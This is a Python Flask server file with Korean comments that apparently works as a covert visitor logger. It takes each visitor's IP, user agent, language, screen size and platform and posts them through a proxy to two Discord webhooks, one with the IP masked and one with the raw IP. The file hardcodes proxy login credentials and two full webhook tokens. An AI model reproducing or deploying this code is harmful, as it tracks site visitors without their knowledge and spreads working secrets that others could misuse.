import requests
import datetime
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# 프록시 설정 (10001번 포트)
PROXY_URL = "http://mkmp3kpf:pka5tdl4@p.tokenu.to:10001"
PROXIES = {"http": PROXY_URL, "https": PROXY_URL}

# [웹훅 주소] - 두 주소가 확실히 다른지 다시 한번 확인하세요!
MASKED_CHANNEL_URL = "https://discord.com/api/webhooks/1477919339205361767/C8Lbp7KnEF7S63YJOKf1PVa2u-t0i2Z6uk-Zqus8L9-QfR7aj-NlGW3zfVd41sX_beTX"
RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

def get_masked_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.xxx.xxx"
        return ip
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def send_to_discord():
    try:
        client_data = request.json or {}
        x_forwarded = request.headers.get('X-Forwarded-For')
        raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
        masked_ip = get_masked_ip(raw_ip)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        discord_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        def create_payload(ip_val, title_prefix, color, is_admin=False):
            icon = "🛡️" if is_admin else "🌐"
            return {
                "username": f"{title_prefix} 시스템",
                "embeds": [{
                    "title": f"{icon} {title_prefix}: 접속 감지",
                    "color": color,
                    "fields": [
                        {"name": "📍 접속 IP", "value": f"`{ip_val}`", "inline": False},
                        {"name": "🌍 언어/지역", "value": f"`{client_data.get('language', 'N/A')}`", "inline": True},
                        {"name": "🖥️ 해상도", "value": f"`{client_data.get('screen', 'N/A')}`", "inline": True},
                        {"name": "⚙️ 플랫폼", "value": f"`{client_data.get('platform', 'N/A')}`", "inline": False},
                        {"name": "🕵️ 상세 정보", "value": f"```{user_agent}```", "inline": False}
                    ],
                    "footer": {"text": f"기록 시각: {timestamp} | Proxy Mode Active"}
                }]
            }

        # ✅ 1. 마스킹 버전 전송 (MASKED_CHANNEL_URL 사용)
        res1 = requests.post(
            MASKED_CHANNEL_URL,  # <-- 여기를 수정했습니다!
            json=create_payload(masked_ip, "일반 모니터링", 5763719), 
            headers=discord_headers,
            proxies=PROXIES,
            timeout=15
        )
        print(f"Masked Send Status: {res1.status_code}")

        time.sleep(1.5)

        # ✅ 2. 관리자 버전 전송 (RAW_CHANNEL_URL 사용)
        res2 = requests.post(
            RAW_CHANNEL_URL,     # <-- 여기를 확인하세요!
            json=create_payload(raw_ip, "관리자 보안 로그", 15548997, is_admin=True), 
            headers=discord_headers,
            proxies=PROXIES,
            timeout=15
        )
        print(f"Raw Send Status: {res2.status_code}")

    except Exception as e:
        print(f"Error: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
